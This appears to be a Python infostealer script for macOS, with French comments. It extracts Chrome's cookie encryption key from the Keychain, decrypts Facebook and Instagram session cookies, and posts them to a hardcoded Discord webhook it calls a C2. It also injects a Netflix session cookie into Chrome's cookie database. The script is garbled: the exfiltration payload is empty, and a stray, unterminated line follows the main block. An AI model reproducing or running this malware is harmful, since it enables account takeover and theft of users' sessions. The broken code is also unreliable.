import os
import sqlite3
import json
import keyring
import shutil
import requests
import subprocess
import time
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# --- CONFIGURATION CHIRURGICALE ---
# Remplace ces valeurs sur ton GitHub si nécessaire
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"

# Chemins standards pour macOS
CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db")

def kill_chrome():
    """Ferme Chrome proprement pour libérer la base de données."""
    print("[*] Tentative de fermeture de Google Chrome...")
    subprocess.run(["pkill", "-9", "Google Chrome"], capture_output=True)
    time.sleep(2)

def get_encryption_key():
    """Récupère la clé de chiffrement via le Keychain macOS."""
    print("[*] Interrogation du Keychain macOS...")
    password = keyring.get_password("Chrome Safe Storage", "Chrome")
    if not password:
        return None
    # Standard Chrome : Salt 'saltysalt', 1003 itérations
    return PBKDF2(password, b'saltysalt', 16, count=1003)

def decrypt_value(enc_value, key):
    """Déchiffre les cookies AES-128-CBC (bypass du header v10)."""
    try:
        iv = b' ' * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc_value[3:])
        # Nettoyage du padding PKCS7
        return decrypted[:-decrypted[-1]].decode('utf-8')
    except Exception:
        return None

def execute_protocol():
    print(f"[*] Command Center Activé. Utilisateur : {os.getlogin()}")
    
    if not os.path.exists(CHROME_PATH):
        print(f"[!] Erreur : Chemin Chrome introuvable ({CHROME_PATH})")
        return

    # 1. Création de la copie fantôme
    print("[*] Création de la copie Shadow de la base de données...")
    try:
        shutil.copyfile(CHROME_PATH, TEMP_DB)
    except Exception as e:
        print(f"[!] Erreur de copie : {e}")
        return

    conn = sqlite3.connect(TEMP_DB)
    cursor = conn.cursor()
    
    try:
        key = get_encryption_key()
        if not key:
            print("[!] Erreur : Accès au Keychain refusé ou clé introuvable.")
            return

        # 2. Extraction Meta (Facebook & Instagram)
        print("[*] Extraction des tokens de session Meta...")
        query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%' OR host_key LIKE '%instagram.com%'"
        cursor.execute(query)
        
        exfiltration_data = []
        for host, name, enc_val in cursor.fetchall():
            decrypted = decrypt_value(enc_val, key)
            if decrypted:
                exfiltration_data.append(f"Domain: {host} | Name: {name} | Value: {decrypted}")

        # 3. Exfiltration vers Discord
        if exfiltration_data:
            print(f"[+] {len(exfiltration_data)} tokens trouvés. Envoi au C2...")
            # Envoi par paquets de 10 pour éviter les limites Discord
            payload = {
                }
            requests.post(DISCORD_WEBHOOK, json=payload)
        else:
            print("[!] Aucun token Meta trouvé.")

        # 4. Injection Netflix (Le fix des 11 colonnes)
        if NETFLIX_COOKIE_VAL and NETFLIX_COOKIE_VAL != "TON_COOKIE_NETFLIX":
            print("[*] Injection du Persistence Layer (Netflix)...")
            # Formatage des timestamps Chrome (microsecondes depuis 1601)
            now_ts = int((time.time() + 11644473600) * 1000000)
            expiry = 13350000000000000 # Expire en 2027+
            
            sql = """
                INSERT OR REPLACE INTO cookies 
                (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """
            params = (now_ts, '.netflix.com', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
            
            cursor.execute(sql, params)
            conn.commit()
            print("[+] Injection terminée avec succès.")

    except Exception as e:
        print(f"[!] Erreur critique : {e}")
    finally:
        conn.close()
        # 5. Synchronisation finale
        kill_chrome()
        try:
            print("[*] Synchronisation des nodes avec le système...")
            shutil.copyfile(TEMP_DB, CHROME_PATH)
            if os.path.exists(TEMP_DB):
                os.remove(TEMP_DB)
            print("[+++] Protocole terminé. Nodes synchronisés.")
        except Exception as e:
            print(f"[!] Erreur de sync finale (Ferme Chrome avec CMD+Q) : {e}")

if __name__ == "__main__":
    execute_protocol()
                "content": f"**STRIKE SUCCESS**\nUser: {os.getlogin()}\n
